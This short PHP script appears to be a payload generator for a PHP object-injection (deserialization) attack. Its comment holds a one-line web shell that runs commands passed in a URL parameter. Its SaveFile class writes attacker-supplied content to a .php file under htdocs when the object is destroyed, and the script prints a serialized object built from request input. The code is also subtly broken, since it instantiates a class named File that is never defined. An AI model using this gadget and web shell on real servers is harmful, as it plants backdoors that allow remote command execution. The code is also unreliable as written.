<?php
/*
<?php echo system($_GET['cmd']); ?>
*/
class SaveFile
{
    public $fileName;
    public $content;

    public function __construct($content)
    {
        $date = new DateTime();
        $this->fileName = 'htdocs/' . $date->format('Y-m-d') . '.php';
        $this->content = $content;
    }

    public function __destruct()
    {
        file_put_contents($this->fileName, $this->content);
    }

    public function __toString()
    {
        return "File created";
    }
}

$t = new File($_GET['var']);
echo serialize($t);
